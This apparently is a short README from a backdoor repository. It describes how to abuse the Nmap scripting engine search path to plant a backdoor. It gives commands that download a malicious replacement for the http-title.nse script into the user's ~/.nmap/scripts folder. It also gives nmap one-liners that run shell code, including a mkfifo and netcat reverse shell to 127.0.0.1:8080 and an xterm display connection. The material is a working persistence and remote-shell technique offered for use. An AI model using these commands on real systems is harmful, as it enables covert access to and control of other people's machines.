Creating backdoors with Nmap Script Engine
======================

"*...Absolute names are used directly. Relative paths are looked for in the scripts of each of the following places...*"

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=bPaCfKc4Ow4" target="_blank"><img src="http://img.youtube.com/vi/bPaCfKc4Ow4/0.jpg" alt="Abusing nmap NSE search path" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

mkdir -p ~/.nmap/scripts/
cd ~/.nmap/scripts/
curl -O 'https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/master/nmap/http-title.nse'

```

You can use whatever payload you want to exploit, using crontab trick to demo one of many ways how can be harmful.

**Nmap command execution oneliner**
nmap --script <(echo "os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f')")
nmap --script <(echo "os.execute('xterm -display 127.0.0.1:1')")

